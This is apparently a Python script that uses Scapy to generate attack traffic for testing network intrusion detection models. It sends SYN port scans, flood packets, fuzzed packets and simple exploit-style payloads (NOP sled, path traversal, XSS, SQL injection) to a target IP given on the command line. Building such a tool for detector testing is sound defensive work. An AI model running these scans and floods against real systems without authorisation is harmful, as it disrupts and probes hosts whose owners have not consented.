#!/usr/bin/env python3
"""
Comprehensive Attack Script - Generates ALL attack types understood by NIDS models
Based on real_packet_attack.py but covers: DoS, Exploits, Fuzzers, Generic, Reconnaissance
"""

import socket
import struct
import time
import random
import threading
import argparse
from scapy.all import *

class ComprehensiveAttacker:
    """Generates all attack types that NIDS models can detect"""
    
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.packets_sent = 0
        self.running = False
        self.slow_mode = False
        
        # Attack type counters
        self.attack_stats = {
            'DoS': 0,
            'Exploits': 0, 
            'Fuzzers': 0,
            'Generic': 0,
            'Reconnaissance': 0
        }
    
    def reconnaissance_attack(self, duration: int = 30):
        """RECONNAISSANCE: Port scanning and network discovery"""
        print(f"🔍 Starting RECONNAISSANCE attack for {duration}s")
        
        # Comprehensive port scan
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            port = random.choice(common_ports)
            
            try:
                # SYN scan packet
                packet = IP(dst=self.target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=0)
                
                self.packets_sent += 1
                self.attack_stats['Reconnaissance'] += 1
                
                if self.attack_stats['Reconnaissance'] % 10 == 0:
                    print(f"   📡 Reconnaissance: {self.attack_stats['Reconnaissance']} scans sent")
                
                sleep_time = 3.0 if self.slow_mode else 1.0
                time.sleep(sleep_time)  # Adjustable delay between scans
                
            except Exception as e:
                print(f"   ❌ Recon failed on port {port}: {e}")
        
        print(f"✅ Reconnaissance complete: {self.attack_stats['Reconnaissance']} packets")
    
    def dos_attack(self, duration: int = 25):
        """DoS: Multiple denial of service attack vectors"""
        print(f"🌊 Starting DoS attack for {duration}s")
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                attack_type = random.choice(['syn_flood', 'udp_flood', 'icmp_flood'])
                
                if attack_type == 'syn_flood':
                    # SYN flood attack
                    src_port = random.randint(1024, 65535)
                    packet = IP(dst=self.target_ip)/TCP(sport=src_port, dport=80, flags="S")
                    send(packet, verbose=0)
                
                elif attack_type == 'udp_flood':
                    # UDP flood attack
                    payload_size = random.randint(100, 1400)
                    payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                    packet = IP(dst=self.target_ip)/UDP(dport=random.choice([53, 123, 161]))/Raw(load=payload)
                    send(packet, verbose=0)
                
                elif attack_type == 'icmp_flood':
                    # ICMP flood attack
                    packet = IP(dst=self.target_ip)/ICMP()
                    send(packet, verbose=0)
                
                self.packets_sent += 1
                self.attack_stats['DoS'] += 1
                
                if self.attack_stats['DoS'] % 25 == 0:
                    print(f"   💥 DoS: {self.attack_stats['DoS']} packets sent")
                
                sleep_time = 2.0 if self.slow_mode else 0.5
                time.sleep(sleep_time)  # Adjustable delay between DoS packets
                
            except Exception as e:
                print(f"   ❌ DoS attack error: {e}")
                break
        
        print(f"✅ DoS attack complete: {self.attack_stats['DoS']} packets")
    
    def exploits_attack(self, duration: int = 20):
        """EXPLOITS: Buffer overflow and exploit attempts"""
        print(f"💥 Starting EXPLOITS attack for {duration}s")
        
        # Common exploit target ports
        exploit_ports = [21, 22, 23, 80, 135, 139, 443, 445, 3389]
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                port = random.choice(exploit_ports)
                
                # Create exploit-like payload (buffer overflow simulation)
                exploit_patterns = [
                    b"A" * 1000,  # Buffer overflow
                    b"\x90" * 500 + b"\xcc" * 100,  # NOP sled + shellcode
                    b"%s" * 200,  # Format string attack
                    b"../../../etc/passwd\x00",  # Directory traversal
                    b"<script>alert('xss')</script>",  # XSS attempt
                    b"' OR 1=1--",  # SQL injection
                ]
                
                payload = random.choice(exploit_patterns)
                
                if port in [80, 443, 8080]:
                    # HTTP-based exploit
                    packet = IP(dst=self.target_ip)/TCP(dport=port, flags="PA")/Raw(load=payload)
                else:
                    # Generic TCP exploit
                    packet = IP(dst=self.target_ip)/TCP(dport=port, flags="PA")/Raw(load=payload)
                
                send(packet, verbose=0)
                
                self.packets_sent += 1
                self.attack_stats['Exploits'] += 1
                
                if self.attack_stats['Exploits'] % 10 == 0:
                    print(f"   🎯 Exploits: {self.attack_stats['Exploits']} attempts sent")
                
                sleep_time = 5.0 if self.slow_mode else 2.0
                time.sleep(sleep_time)  # Adjustable delay between exploits
                
            except Exception as e:
                print(f"   ❌ Exploit attempt failed: {e}")
        
        print(f"✅ Exploits attack complete: {self.attack_stats['Exploits']} packets")
    
    def fuzzers_attack(self, duration: int = 15):
        """FUZZERS: Random malformed packets and fuzzing"""
        print(f"🎲 Starting FUZZERS attack for {duration}s")
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                # Generate random malformed packets
                fuzz_type = random.choice(['malformed_tcp', 'random_payload', 'invalid_flags'])
                
                if fuzz_type == 'malformed_tcp':
                    # Malformed TCP packet
                    packet = IP(dst=self.target_ip)/TCP(
                        dport=random.randint(1, 65535),
                        flags=random.randint(0, 255),  # Random flags
                        window=random.randint(0, 65535),
                        urgptr=random.randint(0, 65535)
                    )
                
                elif fuzz_type == 'random_payload':
                    # Random payload fuzzing
                    payload_size = random.randint(1, 2000)
                    random_payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                    packet = IP(dst=self.target_ip)/TCP(dport=80)/Raw(load=random_payload)
                
                elif fuzz_type == 'invalid_flags':
                    # Invalid flag combinations
                    invalid_flags = random.choice([0xFF, 0x00, 0x3F, 0xC0])  # Invalid combinations
                    packet = IP(dst=self.target_ip)/TCP(dport=80, flags=invalid_flags)
                
                send(packet, verbose=0)
                
                self.packets_sent += 1
                self.attack_stats['Fuzzers'] += 1
                
                if self.attack_stats['Fuzzers'] % 15 == 0:
                    print(f"   🎲 Fuzzers: {self.attack_stats['Fuzzers']} fuzz packets sent")
                
                sleep_time = 4.0 if self.slow_mode else 1.5
                time.sleep(sleep_time)  # Adjustable delay between fuzz attempts
                
            except Exception as e:
                print(f"   ❌ Fuzzer error: {e}")
        
        print(f"✅ Fuzzers attack complete: {self.attack_stats['Fuzzers']} packets")
    
    def generic_attack(self, duration: int = 18):
        """GENERIC: Mixed attack patterns and anomalous traffic"""
        print(f"🔀 Starting GENERIC attack for {duration}s")
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                # Mix of different attack patterns
                attack_pattern = random.choice([
                    'unusual_ports', 'high_frequency', 'large_packets', 'fragmented'
                ])
                
                if attack_pattern == 'unusual_ports':
                    # Connections to unusual high ports
                    unusual_port = random.randint(30000, 65535)
                    packet = IP(dst=self.target_ip)/TCP(dport=unusual_port, flags="S")
                
                elif attack_pattern == 'high_frequency':
                    # Rapid connection attempts (but slower)
                    for _ in range(3):  # Burst of 3 packets
                        packet = IP(dst=self.target_ip)/TCP(dport=80, flags="S")
                        send(packet, verbose=0)
                        time.sleep(0.2)  # 200ms between burst packets
                
                elif attack_pattern == 'large_packets':
                    # Unusually large packets
                    large_payload = b"X" * random.randint(1400, 1500)
                    packet = IP(dst=self.target_ip)/TCP(dport=80)/Raw(load=large_payload)
                
                elif attack_pattern == 'fragmented':
                    # Fragmented packets
                    packet = IP(dst=self.target_ip, flags="MF")/TCP(dport=80)
                
                send(packet, verbose=0)
                
                self.packets_sent += 1
                self.attack_stats['Generic'] += 1
                
                if self.attack_stats['Generic'] % 12 == 0:
                    print(f"   🔀 Generic: {self.attack_stats['Generic']} anomalous packets sent")
                
                sleep_time = 6.0 if self.slow_mode else 2.5
                time.sleep(sleep_time)  # Adjustable delay between generic attacks
                
            except Exception as e:
                print(f"   ❌ Generic attack error: {e}")
        
        print(f"✅ Generic attack complete: {self.attack_stats['Generic']} packets")
    
    def comprehensive_attack(self, duration: int = 120):
        """Launch all attack types simultaneously"""
        print(f"🎭 Starting COMPREHENSIVE multi-vector attack for {duration}s")
        print("   This generates ALL attack types your NIDS can detect!")
        
        self.running = True
        
        # Calculate duration for each attack type
        recon_duration = duration // 4
        dos_duration = duration // 3
        exploits_duration = duration // 5
        fuzzers_duration = duration // 6
        generic_duration = duration // 5
        
        # Launch all attack types in parallel (but staggered more)
        attacks = [
            threading.Thread(target=self.reconnaissance_attack, args=(recon_duration,)),
            threading.Thread(target=self.dos_attack, args=(dos_duration,)),
            threading.Thread(target=self.exploits_attack, args=(exploits_duration,)),
            threading.Thread(target=self.fuzzers_attack, args=(fuzzers_duration,)),
            threading.Thread(target=self.generic_attack, args=(generic_duration,))
        ]
        
        print("🚀 Launching all attack vectors (with delays for system stability)...")
        for i, attack in enumerate(attacks):
            attack.start()
            time.sleep(8)  # Stagger attacks by 8 seconds for better processing
            print(f"   Vector {i+1}/5 launched (waiting 8s between launches)")
        
        # Wait for all attacks to complete
        for attack in attacks:
            attack.join()
        
        self.running = False
        print("✅ Comprehensive attack complete")
    
    def print_stats(self):
        """Print comprehensive attack statistics"""
        print(f"\n📊 Comprehensive Attack Statistics:")
        print(f"   Total Packets Sent: {self.packets_sent}")
        print(f"   Target: {self.target_ip}")
        print(f"\n🎯 Attack Breakdown:")
        for attack_type, count in self.attack_stats.items():
            print(f"   {attack_type}: {count} packets")
        print(f"\n💡 All attack types supported by your NIDS models!")

def main():
    """Main attack function"""
    parser = argparse.ArgumentParser(description="Comprehensive Attack Script for NIDS Testing")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("--attack", choices=[
        "reconnaissance", "dos", "exploits", "fuzzers", "generic", "comprehensive"
    ], default="comprehensive", help="Attack type")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--slow", action="store_true", help="Use slow mode for better system compatibility")
    
    args = parser.parse_args()
    
    print("🕷️  Comprehensive NIDS Attack Script")
    print("=" * 50)
    print(f"🎯 Target: {args.target_ip}")
    print(f"⚔️  Attack: {args.attack}")
    print(f"⏱️  Duration: {args.duration}s")
    print("🚨 Generates ALL attack types your NIDS can detect!")
    print("=" * 50)
    
    # Initialize attacker
    attacker = ComprehensiveAttacker(args.target_ip)
    
    # Apply slow mode if requested
    if args.slow:
        print("🐌 SLOW MODE: Extra delays for system compatibility")
        attacker.slow_mode = True
    else:
        attacker.slow_mode = False
    
    print(f"\n🚀 Starting {args.attack} attack...")
    print("💡 Your NIDS should detect multiple attack types!")
    
    try:
        if args.attack == "reconnaissance":
            attacker.reconnaissance_attack(args.duration)
        elif args.attack == "dos":
            attacker.dos_attack(args.duration)
        elif args.attack == "exploits":
            attacker.exploits_attack(args.duration)
        elif args.attack == "fuzzers":
            attacker.fuzzers_attack(args.duration)
        elif args.attack == "generic":
            attacker.generic_attack(args.duration)
        elif args.attack == "comprehensive":
            attacker.comprehensive_attack(args.duration)
    
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        attacker.running = False
    except Exception as e:
        print(f"\n❌ Attack failed: {e}")
        print("💡 Try running as administrator for raw packet access")
    
    # Print results
    attacker.print_stats()
    print("\n🎉 Comprehensive attack complete!")
    print("💻 Check your NIDS for detection of all attack types!")
    
    return 0

if __name__ == "__main__":
    exit(main())